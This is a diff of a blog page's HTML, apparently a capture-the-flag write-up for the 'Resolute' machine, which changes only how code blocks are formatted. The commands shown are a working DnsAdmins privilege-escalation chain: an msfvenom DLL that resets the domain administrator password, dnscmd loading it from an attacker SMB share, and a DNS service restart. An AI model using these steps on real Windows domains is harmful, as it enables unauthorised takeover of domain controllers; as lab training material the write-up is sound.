@@ -238,7 +238,8 @@ Host script results:
 
 <p>we’re going to use a payload that doesn’t cause the <strong>DNS</strong> service to hang. It should be something simple like changing the the domain administrator’s password</p>
 
-<p><code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/exec cmd='net user administrator $$Y0uJustG0tOwn3d$$ /domain' -f dll &gt; owned.dll</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/exec <span class="nv">cmd</span><span class="o">=</span><span class="s1">'net user administrator $$Y0uJustG0tOwn3d$$ /domain'</span> <span class="nt">-f</span> dll <span class="o">&gt;</span> owned.dll
+</code></pre></div></div>
 
 <p><img src="/assets/Resolute/killer-dll.jpg" alt="killer-dll" /></p>
 
@@ -248,11 +249,12 @@ Host script results:
 
 <p><em>after that,</em> we’re going to reconfigure the <strong>DNS</strong> service using <code class="language-plaintext highlighter-rouge">dnscmd</code> with the <code class="language-plaintext highlighter-rouge">/config</code> flag along with <code class="language-plaintext highlighter-rouge">/serverlevelplugindll</code> pointing to our <strong>SMB</strong> share named <code class="language-plaintext highlighter-rouge">share</code>. It should be as below:</p>
 
-<p><code class="language-plaintext highlighter-rouge">dnscmd /config /serverlevelplugindll \\10.10.16.3\share\adduser.dll</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnscmd /config /serverlevelplugindll \\10.10.16.3\share\adduser.dll
+</code></pre></div></div>
 
 <p>we can then trigger the execution by stopping the <strong>DNS</strong> service and restarting it.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc.exe stop dns
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc.exe stop dns
 sc.exe start dns
 </code></pre></div></div>
 
